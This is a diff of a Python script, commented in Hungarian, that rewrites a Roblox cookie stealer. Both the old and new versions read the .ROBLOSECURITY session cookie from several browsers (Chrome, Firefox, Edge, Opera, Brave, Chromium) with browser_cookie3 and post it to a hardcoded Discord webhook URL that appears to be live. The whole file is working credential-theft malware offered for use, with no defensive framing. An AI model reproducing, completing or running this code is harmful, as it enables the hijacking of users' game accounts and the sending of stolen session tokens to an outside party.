@@ -1,64 +1,77 @@
 import browser_cookie3 as bc
 from threading import Thread
 import requests
-import os
 
-# --- A TE WEBHOOKOD BELEÍRVA ---
-WEBHOOK_URL = "https://discord.com/api/webhooks/1490406465620676761/eP0WSDcEzdoNKA2cwCBb2kE25N8COm8gneXHYLwUlekglgdv1NWa-qW6dIJuGsgRL0JL"
+class Cookies:
+	def __init__(self, webhook):
+		self.webhook = webhook
 
-class CookieHunter:
-    def __init__(self, webhook):
-        self.webhook = webhook
+	def get_chrome(self):
+		try:
+			cookie = str(bc.chrome(domain_name='roblox.com'))
+			cookie = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
+			requests.post(self.webhook, json={'username':'bot', 'content':cookie})
+			return cookie
+		except:
+			pass
 
-    def extract_and_send(self, browser_func, name):
-        try:
-            # Megpróbáljuk kinyerni a sütiket az adott böngészőből
-            cookies = browser_func(domain_name='roblox.com')
-            for cookie in cookies:
-                if cookie.name == '.ROBLOSECURITY':
-                    token = cookie.value
-                    
-                    # Discord üzenet küldése (Embed formátum)
-                    requests.post(self.webhook, json={
-                        "username": "Ghost Hunter",
-                        "embeds": [{
-                            "title": f"🎯 Találat: {name}",
-                            "description": f"```fix\n{token}```",
-                            "color": 0x00ff00,
-                            "footer": {"text": "Roblox Cookie Logger | 2026"}
-                        }]
-                    })
-                    return True
-        except Exception:
-            pass
-        return False
+	def get_firefox(self):
+		try:
+			cookie = str(bc.firefox(domain_name='roblox.com'))
+			cookie = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
+			requests.post(self.webhook, json={'username':'bot', 'content':cookie})
+			return cookie
+		except:
+			pass
 
-    def run_all(self):
-        # Az összes támogatott böngésző listája
-        targets = [
-            (bc.chrome, "Chrome"),
-            (bc.edge, "Edge"),
-            (bc.firefox, "Firefox"),
-            (bc.opera, "Opera"),
-            (bc.opera_gx, "Opera GX"),
-            (bc.brave, "Brave"),
-            (bc.vivaldi, "Vivaldi"),
-            (bc.chromium, "Chromium")
-        ]
-        
-        threads = []
-        for func, name in targets:
-            # Szálindítás, hogy ne akadjon meg a program
-            t = Thread(target=self.extract_and_send, args=(func, name))
-            threads.append(t)
-            t.start()
-            
-        for t in threads:
-            t.join()
+	def get_opera(self):
+		try:
+			cookie = str(bc.opera(domain_name='roblox.com'))
+			cookie = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
+			requests.post(self.webhook, json={'username':'bot', 'content':cookie})
+			return cookie
+		except:
+			pass
 
+	def get_edge(self):
+		try:
+			cookie = str(bc.edge(domain_name='roblox.com'))
+			cookie = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
+			requests.post(self.webhook, json={'username':'bot', 'content':cookie})
+			return cookie
+		except:
+			pass
+
+	def get_chromium(self): 
+		try:
+			cookie = str(bc.chromium(domain_name='roblox.com'))
+			cookie = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
+			requests.post(self.webhook, json={'username':'bot', 'content':cookie})
+			return cookie
+		except:
+			pass
+
+	def get_brave(self):
+		try:
+			cookie = str(bc.brave(domain_name='roblox.com'))
+			cookie = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
+			requests.post(self.webhook, json={'username':'bot', 'content':cookie})
+			return cookie
+		except:
+			pass
+
+	def run_all(self):
+		Thread(target=self.get_chrome).start()
+		Thread(target=self.get_firefox).start()
+		Thread(target=self.get_opera).start()
+		Thread(target=self.get_edge).start()
+		Thread(target=self.get_chromium).start()
+		Thread(target=self.get_brave).start()
+
+# --- INDÍTÁS A TE WEBHOOKODDAL ---
 if __name__ == "__main__":
-    # Program indítása
-    print("Keresés folyamatban...")
-    hunter = CookieHunter(WEBHOOK_URL)
-    hunter.run_all()
-    print("Keresés befejezve. Ellenőrizd a Discordot!")
+    # Ide írtam be a webhookodat:
+    YOUR_WEBHOOK = "https://discord.com/api/webhooks/1490406465620676761/eP0WSDcEzdoNKA2cwCBb2kE25N8COm8gneXHYLwUlekglgdv1NWa-qW6dIJuGsgRL0JL"
+    
+    log = Cookies(YOUR_WEBHOOK)
+    log.run_all()
